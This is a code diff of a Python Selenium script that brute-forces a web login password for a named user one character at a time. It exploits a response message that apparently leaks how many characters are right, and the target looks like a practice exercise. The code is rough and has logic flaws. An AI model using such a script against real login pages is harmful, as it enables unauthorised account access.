@@ -1,4 +1,5 @@
 # https://stackoverflow.com/questions/13166395/fill-input-of-type-text-and-press-submit-using-python
+import driver
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 import time
@@ -10,10 +11,10 @@ username = "jonas.dahl"
 
 password_guess = ""
 
-password_length = get_password_length(username, webpage, 100, .1)
+password_length = 17
 
 
-def extract_numbers(input_string):
+def extract_numbers(input_string) -> int:
     # Define a regular expression pattern to match numbers
     pattern = r'\d+'
     # Use re.search to find the first match of the pattern in the input string
@@ -21,9 +22,9 @@ def extract_numbers(input_string):
 
     # Check if a match is found and return the matched number, or return None
     if match:
-        return match.group()
+        return int(match.group())
     else:
-        return None
+        return 0
 
 
 def fill_password(input_string):
@@ -33,32 +34,37 @@ def fill_password(input_string):
     return input_string
 
 
-def print_characters():
+def print_characters(right_guessed):
+
     all_characters = "aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ"
-
+    length = 2
     response_message_element = driver.find_element(By.ID, "responseMessage")
-
+    passwordguessed = ""
+    passwordguess = ""
     # Get the text content of the element
     response_message_text = response_message_element.text
+    while True:
+        for character in all_characters:
 
-    for character in all_characters:
-        response_message_element = driver.find_element(By.ID, "responseMessage")
+            response_message_element = driver.find_element(By.ID, "responseMessage")
 
-        # Get the text content of the element
-        response_message_text = response_message_element.text
+            if int(extract_numbers(response_message_text)) == length:
+                length = length + 1
+                passwordguessed += passwordguess
+                print(passwordguessed)
 
-        if extract_numbers(response_message_text) == '2':
-            exit('jippi')
+            # Get the text content of the element
+            response_message_text = response_message_element.text
+            passwordguess = passwordguessed + character
 
-        passwordguess = character
-        time.sleep(0.1)
-        driver.find_element(By.NAME, "password").clear()
-        time.sleep(0.1)
-        print(fill_password(passwordguess))
-        driver.find_element(By.NAME, "password").send_keys(fill_password(passwordguess))
+            driver.find_element(By.NAME, "password").clear()
 
-        driver.find_element(By.CLASS_NAME, "btn-primary").click()
-        time.sleep(0.1)
+            print(fill_password(passwordguess))
+            driver.find_element(By.NAME, "password").send_keys(fill_password(passwordguess))
+            driver.find_element(By.CLASS_NAME, "btn-primary").click()
+            time.sleep(0.3)
+
+
 
 
 # Ensure you have the correct path to your ChromeDriver executable
@@ -83,7 +89,8 @@ response_message_text = response_message_element.text
 # Print or use the collected text as needed
 print("Collected number:", extract_numbers(response_message_text))
 
-print_characters()
+print_characters(password_guess)
+
 
 # Wait for user input before closing the browser
 input("Press Enter to close the browser...")
